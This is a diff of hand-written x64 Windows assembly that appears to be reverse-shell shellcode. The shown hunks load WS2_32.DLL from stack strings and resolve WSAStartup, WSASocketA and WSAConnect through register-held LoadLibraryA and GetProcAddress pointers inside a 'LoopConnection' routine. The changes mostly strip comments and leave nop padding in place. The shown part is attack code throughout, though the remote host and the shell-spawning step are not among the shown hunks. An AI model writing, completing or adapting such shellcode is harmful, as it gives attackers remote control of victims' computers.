@@ -69,17 +69,17 @@ WinMain:
 
 
         ; Call LoadLibraryA on WS2_32.DLL 
-                xor rax, rax; 
-                mov rax, 0x6C6C;                   # ll
-                push rax; 
-                mov rax, 0x642E32335F325357;       # WS2_32.d
-                push rax; 
-                mov rcx, rsp;                      # copy stack string to RCX
-                sub rsp, 0x30; 
-                call rsi;                          # Call LoadLibraryA
-                mov r15, rax; 
-                add rsp, 0x30;                     # Clean allocated space on stack
-                add rsp, 0x10;                     # Clean space for ws2_32.dll
+                xor rax, rax 
+                mov rax, 0x6C6C                   
+                push rax 
+                mov rax, 0x642E32335F325357;       
+                push rax 
+                mov rcx, rsp                     
+                sub rsp, 0x30 
+                call rsi                          
+                mov r15, rax 
+                add rsp, 0x30                     
+                add rsp, 0x10                     
         
         LoopConnection:
         ; Lookup WSAStartup Address
@@ -87,13 +87,13 @@ WinMain:
                 push rax
                 mov rax, 'WSAStart'
                 push rax
-                mov rdx, rsp;                      # WSAStartup into RDX
-                mov rcx, r15;                      # Copy WS2_32 base address to RCX
+                mov rdx, rsp
+                mov rcx, r15
                 sub rsp, 0x30
-                call r14;                          # Call GetProcessAddress
+                call r14
                 add rsp, 0x30
-                add rsp, 0x10;                     # Remove Allocated LoadLibrary string  
-                mov r12, rax;                      # Save the address of WSAStartup in RSI
+                add rsp, 0x10 
+                mov r12, rax
                 nop
                 nop
                 nop
@@ -103,14 +103,14 @@ WinMain:
         ; Call WSAStartup
                 xor rdx,rdx
                 xor rcx,rcx
-                mov ecx, 0x02020202;               # rcx = sizeof(struct WSAData)
+                mov ecx, 0x02020202
                 push rcx
-                lea rdx,[rsp];                     # lpWSAData [out]
+                lea rdx,[rsp]
                 mov ecx, 0x202;
                 sub rsp, 0x30
                 xor r10,r10
                 push r10
-                call r12;                          # Call WSAStartup
+                call r12
                 add rsp,0x30
                 add rsp, 0x10
         ; Lookup WSASocketA Address
@@ -118,13 +118,13 @@ WinMain:
                 push rax
                 mov rax, 0x656b636f53415357
                 push rax
-                mov rdx, rsp;                      # WSASocketA into RDX
-                mov rcx, r15;                      # Copy WS2_32 base address to RCX
-                sub rsp, 0x30;                     # Make some room on the stack
-                call r14;                          # Call GetProcessAddress
-                add rsp, 0x30;                     # Remove allocated stack space
-                add rsp, 0x10;                     # Remove Allocated LoadLibrary string
-                mov r12, rax;
+                mov rdx, rsp
+                mov rcx, r15
+                sub rsp, 0x30
+                call r14
+                add rsp, 0x30
+                add rsp, 0x10
+                mov r12, rax
 
         ; Create a socket with WSASocketA
                 sub rsp,0x208; 
@@ -146,8 +146,8 @@ WinMain:
 
         ; Lookup WSAConnect Address
                 sub rsp, 0x208
-                mov rax, 0x7463; 
-                push rax; 
+                mov rax, 0x7463 
+                push rax 
                 mov rax, 0x656e6e6f43415357; 
                 push rax;                          # WSAConnect
                 mov rdx, rsp;                      # WSAConnect into RDX
